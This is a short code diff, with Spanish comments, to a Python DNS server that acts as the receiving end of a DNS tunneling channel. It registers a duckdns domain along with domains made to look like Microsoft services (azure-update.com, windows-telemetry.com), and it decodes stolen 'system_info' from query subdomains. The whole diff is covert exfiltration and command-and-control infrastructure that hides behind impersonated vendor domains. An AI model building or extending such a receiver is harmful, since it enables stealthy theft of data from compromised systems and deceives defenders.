@@ -39,13 +39,18 @@ class DNSReportReceiver:
 class DNSHandler:
     def __init__(self, receiver):
         self.receiver = receiver
+        #  DOMINIOS CORRECTOS para DNS tunneling
+        self.tunneling_domains = [
+            'helloneighbor.duckdns.org',  # ← TU DOMINIO
+            'azure-update.com',           # Para backwards compatibility
+            'windows-telemetry.com'       # Para backwards compatibility
+        ]
 
     def handle_request(self, request, handler):
         domain = str(request.q.qname).rstrip('.')
 
-        # Check for our DNS tunneling domains
-        tunneling_domains = ['azure-update.com', 'windows-telemetry.com', 'microsoft-ocsp.net']
-        if any(tunnel_domain in domain for tunnel_domain in tunneling_domains):
+        # Check for our DNS tunneling domains (¡AHORA CORRECTO!)
+        if any(tunnel_domain in domain for tunnel_domain in self.tunneling_domains):
             subdomain = domain.split('.')[0]
             system_info = self.receiver.decode_dns_data(subdomain)
 
